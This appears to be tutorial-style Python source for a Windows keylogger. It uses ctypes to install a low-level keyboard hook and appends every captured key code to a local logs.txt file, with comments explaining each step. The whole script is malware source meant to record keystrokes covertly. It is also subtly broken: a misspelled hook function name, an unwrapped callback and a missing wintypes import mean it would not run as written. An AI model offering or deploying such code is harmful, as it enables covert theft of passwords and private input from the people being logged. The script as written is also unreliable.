import ctypes

# loading the windows library and using user32 to handle it
user32 = ctypes.windll.user32

#Mapiing a C structure to a python class to be able to read the key details
class kb_struct(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.c_ulong),
        ("scanCode", ctypes.c_ulong),
        ("flags", ctypes.c_ulong),
        ("time", ctypes.c_ulong),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))
    ]


# cast() helps in converting the pointer to the another pointer.
# ctypes.POINTER(kb_struct) creates a pointer to the kb_struct structure, and contents gives us access to the actual data in that structure.
# .contents to defrence the pointer and access the actual data in the structure.
def keyboard_callback(ncode,wParam,lParam):
    if ncode == 0:
        key = wParam
        key_details = ctypes.cast(lParam, ctypes.POINTER(kb_struct)).contents
        actual_key = key_details.vkCode
        store_keys(actual_key)
        return user32.CallNextHookEx(None, ncode, wParam, lParam)

def store_keys(key):
    with open("logs.txt","a") as f:
        f.write(f"{key}")
        
 
# installing the hook
# installs the hook into the windows event system
hook = user32.SetWindowsHooksExW(
    13,
    keyboard_callback,
    user32.GetModuleHandle(None),
    0
)

# message loop to keep the program running and listening for events
msg = ctypes.wintypes.MSG()

while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
    user32.TranslateMessage(ctypes.byref(msg))
    user32.DispatchMessageW(ctypes.byref(msg))


